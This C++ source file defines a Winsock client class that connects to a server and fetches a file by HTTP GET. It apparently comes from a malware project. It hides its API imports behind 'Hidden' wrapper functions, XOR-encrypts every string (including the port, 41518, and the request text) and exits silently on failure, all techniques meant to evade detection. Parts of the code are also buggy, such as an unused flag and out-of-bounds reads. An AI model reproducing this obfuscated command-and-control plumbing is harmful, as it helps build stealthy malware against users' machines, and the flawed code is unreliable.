#include "main.h"

CWinsock g_Winsock;

CWinsock::CWinsock(VOID)
{
	m_ConnectedSocket = INVALID_SOCKET;
}

CWinsock::~CWinsock(VOID)
{

}

VOID CWinsock::InitWinsock(VOID)
{
	WSADATA wsaData;

	if (WSAStartupHidden(MAKEWORD(2, 2), &wsaData) != 0)
	{
		ExitProcessHidden(0);
	}

}

VOID CWinsock::Connect(const char* pszServerUrl)
{
	m_pszConnectedUrl = pszServerUrl;

	addrinfo hints, *pAddrInfo;

	SecureZeroMemory(&hints, sizeof (hints));

	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	bool bPort;

	if (getaddrinfo(pszServerUrl, /*80*/XorStr<0xA1, 3, 0xC17CCACF>("\x99\x92" + 0xC17CCACF).s/*"41518"*/, &hints, &pAddrInfo) != 0)
	{
		bPort = false;
	}	
	if ((m_ConnectedSocket = socketHidden(pAddrInfo->ai_family, pAddrInfo->ai_socktype, pAddrInfo->ai_protocol)) == INVALID_SOCKET)
	{
		freeaddrinfoHidden(pAddrInfo);
		CleanUp();
		ExitProcessHidden(0);
	}

	if (connectHidden(m_ConnectedSocket, pAddrInfo->ai_addr, (INT)pAddrInfo->ai_addrlen) != 0)
	{
		freeaddrinfo(pAddrInfo);
		Disconnect();
		CleanUp();
		ExitProcessHidden(0);
	}

	freeaddrinfo(pAddrInfo);
}



VOID CWinsock::SendHttpGet(const char* pszFileUrl, CString &sDestBuffer)
{
	CString sMsg = /*GET /*/XorStr<0xE8, 6, 0xA662CE1C>("\xAF\xAC\xBE\xCB\xC3" + 0xA662CE1C).s;
	sMsg += pszFileUrl;
	sMsg += /* HTTP/1.0\r\nHost: */XorStr<0x6F, 18, 0xC8585730>("\x4F\x38\x25\x26\x23\x5B\x44\x58\x47\x75\x73\x32\x14\x0F\x09\x44\x5F" + 0xC8585730).s; // 1.0 statt 1.1 wegen Chunked_transfer_encoding
	sMsg += m_pszConnectedUrl;
	sMsg += /*"\r\n\r\n"*/XorStr<0x82, 7, 0x516A64B5>("\xA0\x8E\x8E\x88\x8C\xA5" + 0x516A64B5).s;

	CHAR szRecvBuffer[512];

	if (sendHidden(m_ConnectedSocket, sMsg, strlen(sMsg), 0) == SOCKET_ERROR)
	{
		Disconnect();
		WSACleanupHidden();
		ExitProcessHidden(0);
	}

	INT iBytesReceived = 0;
	do
	{
		iBytesReceived = recvHidden(m_ConnectedSocket, szRecvBuffer, sizeof (szRecvBuffer), 0);

		sDestBuffer.Append(szRecvBuffer, iBytesReceived);

	} while (iBytesReceived > 0);

	for (int i = 0; i < sDestBuffer.GetLength(); i++)
	{
		if (sDestBuffer[i] == '\r' && sDestBuffer[i + 1] == '\n' && sDestBuffer[i + 2] == '\r' && sDestBuffer[i + 3] == '\n')
			sDestBuffer.Delete(0, i + 4);
	}

}

VOID CWinsock::Disconnect(VOID)
{
	if (m_ConnectedSocket != INVALID_SOCKET)
	{
		closesocketHidden(m_ConnectedSocket);
		m_ConnectedSocket = INVALID_SOCKET;
	}

}

VOID CWinsock::CleanUp(VOID)
{
	WSACleanupHidden();
}